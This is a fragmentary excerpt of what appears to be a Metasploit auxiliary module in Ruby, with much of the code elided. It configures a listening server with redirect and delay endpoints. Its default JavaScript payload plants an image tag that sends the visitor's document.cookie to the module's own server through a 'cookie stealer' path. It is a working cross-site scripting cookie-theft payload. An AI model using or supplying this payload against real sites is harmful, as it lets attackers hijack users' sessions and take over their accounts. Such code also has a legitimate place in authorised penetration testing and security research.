...
class MetasploitModule < Msf::Auxiliary
  ...
  def setup
    raise Msf::OptionValidateError, ['TARGET_URI'] if target_uri !~ /^http/i
  ...
  def get_uri(cli = self.cli)
    ...
    host = if datastore['URIHOST']
             datastore['URIHOST']
           elsif cli && cli.peerhost
    ...
    port = if datastore['URIPORT']
             ':' + datastore['URIPORT'].to_s
           elsif ssl && (datastore["SRVPORT"] == 443)
             ''
           elsif !ssl && (datastore["SRVPORT"] == 80)
             ''
           else
  ...
  def js
    datastore['CUSTOMJS'] || %|var e = document.createElement('img'); e.src='#{server_uri}/#{ninja_cookie_stealer_name}?data=' + encodeURIComponent(document.cookie);|
  end
...
<script>
  ...
  def on_request_uri(cli, request)
    ...
    when /redirect\.php/
      ...
      send_redirect(cli, datastore['TARGET_URI'].to_s)
    when /sleep\.php/
      sleep(3)
      send_response(cli, '')
